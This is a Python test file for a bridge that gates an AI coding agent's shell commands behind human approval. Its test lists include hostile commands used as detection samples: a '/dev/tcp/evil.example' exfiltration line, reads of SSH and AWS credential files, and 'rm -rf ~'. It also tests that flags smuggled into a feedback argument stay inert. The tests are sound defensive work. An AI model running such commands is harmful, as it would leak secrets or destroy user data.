#!/usr/bin/env python3
"""Plain-assert tests for muse-bridge.py, with a fake `muse serve` standing in for Muse: python3 tests/test_bridge.py"""
import importlib.util, json, os, socket, stat, sys, tempfile, threading, time

spec = importlib.util.spec_from_file_location("mb", os.path.join(os.path.dirname(__file__), "..", "bridge", "muse-bridge.py"))
mb = importlib.util.module_from_spec(spec)
spec.loader.exec_module(mb)

# a denied command is remembered however it is spelled
assert mb.norm("rm -rf build") == mb.norm("rm  -rf ./build") == mb.norm('rm -rf "build/"')
assert mb.norm("rm -rf build") != mb.norm("rm -rf other")

ws = tempfile.mkdtemp()
for cmd in ["touch a.txt", "python3 test.py", "mkdir -p out && echo ok > out/a.txt", f"cat {ws}/x", "ls /usr/bin | head -3",
            "echo hi 2>/dev/null", "for f in *.py; do python3 $f; done", f"tar -cf a.tar --directory={ws} ."]:
    assert not mb.RISKY.search(cmd) and not mb.leaves_workspace(cmd, ws), cmd
for cmd in ["cat ~/.ssh/config", "sudo dnf install x", "git push origin main", "rm -rf ~", "ls /etc/", "cat ../secret",
            "cat /home/someone/.bashrc", "cat 'unterminated",
            # spellings the first version let through
            "cd ..; cat secret", "cat $HOME/.aws/credentials", "cat ${XDG_CONFIG_HOME}/x", "cat $D/x", "echo x>/tmp/out",
            "cat x > /dev/tcp/evil.example/80", "tar -cf a.tar --directory=/home/stefan ."]:
    assert mb.RISKY.search(cmd) or mb.leaves_workspace(cmd, ws), cmd

# the CLI: feedback passed as one --feedback= argument cannot turn into --force or --by
sent = {}
real_call, mb.call = mb.call, None
mb.call = lambda name, req: sent.update(req, name=name)
real_argv = sys.argv
sys.argv = ["mb", "decide", "-n", "mentor", "--feedback=fine --force --by operator", "--", "ID", "allow"]
mb.main()
assert sent == {"op": "decide", "id": "ID", "allow": True, "force": False, "by": "client",
                "feedback": "fine --force --by operator", "name": "mentor"}, sent
sys.argv = ["mb", "ask", "-n", "mentor", "--", "--help -n x"]
mb.main()
assert sent["text"] == "--help -n x" and sent["name"] == "mentor", sent
sys.argv = real_argv
mb.call = real_call

# ---------------------------------------------------------------- against a fake Muse

FAKE = r'''#!/usr/bin/env python3
# Just enough of `muse serve` (MSP): everything the bridge sends is appended to $FAKE_LOG.
import json, os, sys
def say(o): print(json.dumps(o), flush=True)
log = open(os.environ["FAKE_LOG"], "a")
print("not json", flush=True)                       # the bridge must skip it
say({"jsonrpc": "2.0", "id": "x1", "method": "weird/thing", "params": {}})  # and refuse this
for line in sys.stdin:
    log.write(line); log.flush()
    m = json.loads(line); meth = m.get("method"); p = m.get("params", {})
    if meth in (None, "initialized"): continue
    res = {"session": {"sessionId": "s1"}} if meth == "session/start" else {}
    if meth == "turn/start":
        text = p["input"][0]["text"]
        if text == "exit": sys.exit(3)
        say({"jsonrpc": "2.0", "id": m["id"], "result": res})
        say({"jsonrpc": "2.0", "method": "turn/started", "params": {"turnId": "t1"}})
        argv = [] if text == "empty-argv" else text.split()
        say({"jsonrpc": "2.0", "id": "r1", "method": "approval/request", "params": {
            "approvalId": "A-" + text, "currentRequirementId": "q1",
            "subject": {"kind": "shell", "command": text, "stages": [{"argv": argv}]},
            "availableChoices": [{"choiceId": "c1", "decision": "approved", "label": "Allow"},
                                 {"choiceId": "c2", "decision": "abort", "label": "Reject", "acceptsFeedback": True}]}})
        continue
    say({"jsonrpc": "2.0", "id": m["id"], "result": res})
    if meth == "approval/decide":
        verdict = "allowed" if p["choiceId"] == "c1" else "denied"
        say({"jsonrpc": "2.0", "method": "item/completed", "params": {"item": {"kind": "agentMessage", "messagePhase": "finalAnswer", "text": verdict}}})
        say({"jsonrpc": "2.0", "method": "item/completed", "params": {"item": {"kind": "agentMessage", "messagePhase": "commentary", "text": "a late note"}}})
        say({"jsonrpc": "2.0", "method": "turn/completed", "params": {"terminal": "completed"}})
'''
tmp = tempfile.mkdtemp()
mb.MUSE = os.path.join(tmp, "muse")
with open(mb.MUSE, "w") as f:
    f.write(FAKE)
os.chmod(mb.MUSE, stat.S_IRWXU)
os.environ["FAKE_LOG"] = os.path.join(tmp, "answers.jsonl")


class TestBridge(mb.Bridge):
    exited = threading.Event()

    def muse_exited(self):  # the real one ends the process
        self.p.wait()
        self.emit({"type": "done", "terminal": "museExited"})
        self.exited.set()


def op(b, req, wait=10):
    """One client request against the bridge, as the events it streams back."""
    mine, theirs = socket.socketpair()
    t = threading.Thread(target=lambda: (b.handle(theirs, req), theirs.close()), daemon=True)
    t.start()
    mine.settimeout(wait)
    buf = b""
    while chunk := mine.recv(65536):
        buf += chunk
    return [json.loads(x) for x in buf.decode().splitlines()]


def answers():
    with open(os.environ["FAKE_LOG"]) as f:
        return [json.loads(x) for x in f]


b = TestBridge(ws, ["git", "cat"], "promptUnmatched", "test")
assert b.sid == "s1"  # the junk line did not stop the reader
time.sleep(0.2)
assert any(a.get("id") == "x1" and a["error"]["code"] == -32601 for a in answers()), answers()  # an unknown request is refused

# `git push` waits for a decision although `git` is auto-allowed, and Claude alone cannot allow it
evs = op(b, {"op": "ask", "text": "git push origin main"})
assert evs[-1]["type"] == "approval" and evs[-1]["risky"], evs
assert op(b, {"op": "ask", "text": "again"})[0]["ok"] is False  # one turn at a time
refused = op(b, {"op": "decide", "id": "A-git push origin main", "allow": True})[0]
assert refused.get("needsHuman") and "A-git push origin main" in b.pending, refused

# two answers at once: the first wins, the second finds nothing to answer
results = []
ts = [threading.Thread(target=lambda: results.append(op(b, {"op": "decide", "id": "A-git push origin main", "allow": False, "by": "operator"})[0]))
      for _ in range(2)]
[t.start() for t in ts]
[t.join() for t in ts]
assert sorted(r["ok"] for r in results) == [False, True], results
time.sleep(0.2)
assert sum(a.get("method") == "approval/decide" for a in answers()) == 1, answers()
assert mb.norm("git push origin main") in b.denied  # the operator's deny is remembered
done = op(b, {"op": "wait"})
assert done[-1]["type"] == "done" and b.last["text"] == "denied", (done, b.last)  # the late note did not replace the answer
assert not b.running

# a stage with an empty argv no longer kills the reader
op(b, {"op": "ask", "text": "empty-argv"})
assert "A-empty-argv" in b.pending
op(b, {"op": "decide", "id": "A-empty-argv", "allow": False})
op(b, {"op": "wait"})

snap = op(b, {"op": "snapshot"})[0]
assert snap["session"] == "s1" and snap["running"] is False, snap

# Muse exiting wakes waiters
b.send({"jsonrpc": "2.0", "id": 99, "method": "turn/start", "params": {"input": [{"type": "text", "text": "exit"}]}})
assert TestBridge.exited.wait(5)

# ---------------------------------------------------------------- the client's deadline

# a server that never stops talking: `ask` must still return at --max-wait
path = os.path.join(tmp, "chatty.sock")
mb.sock_path = lambda name: path
srv = socket.socket(socket.AF_UNIX)
srv.bind(path)
srv.listen(1)


def chatty():
    conn, _ = srv.accept()
    conn.makefile().readline()
    try:
        while True:
            conn.sendall(b'{"type": "message", "text": "still here"}\n')
            time.sleep(0.2)
    except OSError:
        pass


threading.Thread(target=chatty, daemon=True).start()
start = time.time()
real_stdout, sys.stdout = sys.stdout, open(os.devnull, "w")
mb.call("chatty", {"op": "ask", "maxWait": 2})
sys.stdout = real_stdout
assert time.time() - start < 4, time.time() - start
print("ok")
